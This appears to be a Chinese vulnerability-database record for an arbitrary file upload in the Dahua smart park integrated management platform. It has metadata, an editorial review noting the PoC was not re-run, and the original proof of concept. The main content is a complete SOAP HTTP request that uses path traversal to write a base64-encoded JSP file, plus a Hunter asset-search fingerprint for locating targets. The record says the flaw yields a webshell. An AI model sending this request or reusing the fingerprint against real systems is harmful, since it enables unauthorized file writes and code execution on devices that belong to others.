---
source: "wy876 漏洞文库"
id: "vw-ed99dd68732862fb1644f011"
entity_id: "ve-ed99dd68732862fb1644f011"
schema_version: "1"
fofa_unverified: "app.name="
title: "大华智慧园区综合管理平台bitmap任意文件上传漏洞"
product: "大华智慧园区综合管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "JSESSIONID，Web目录可写/支持JSP；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0bitmap%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ygkzgd2uu9gcxavq"
source_status: "recorded"
---

# 大华智慧园区综合管理平台bitmap任意文件上传漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：大华智慧园区综合管理平台
- 本文讨论：bitmap uploadPicFile picPath路径穿越写JSP
- 版本、权限与配置前提：JSESSIONID，Web目录可写/支持JSP；版本未知
- 资料类型：SOAP文件写入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- Base64实际为999*999输出并删除自身的JSP，不是命令Webshell，需区分证明文件与后门
- 没有SOAP响应/保存路径映射证据，/../stc.jsp到/upload/stc.jsp需说明
- 身份/版本缺失，Hunter元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 真实上传位置/解析/角色与固件待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞描述
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。 <font style="color:rgba(0, 0, 0, 0.9);">大华智慧园区综合管理平台在/emap/webservice/gis/soap/bitmap接口处存在任意文件上传漏洞，可以利用此漏洞获得webshell。</font>

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ hunter:`app.name="Dahua 大华 智慧园区管理平台"`  

+ 登录页面：


# 四、漏洞复现
```http
POST /emap/webservice/gis/soap/bitmap HTTP/1.1
Cookie: JSESSIONID=C30EF0C843ACBDC71597DEE0CBDADE8C
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 628

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <res:uploadPicFile>
         <arg0>
 <picName>stc.jsp</picName>
                    <!--type: string-->
                    <picPath>/../stc.jsp</picPath>
         </arg0>
         <!--type: base64Binary-->
         <arg1>PCVvdXQucHJpbnQoOTk5Kjk5OSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==</arg1>
      </res:uploadPicFile>
   </soapenv:Body>
</soapenv:Envelope>
```


上传文件位置

```plain
/upload/stc.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ygkzgd2uu9gcxavq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
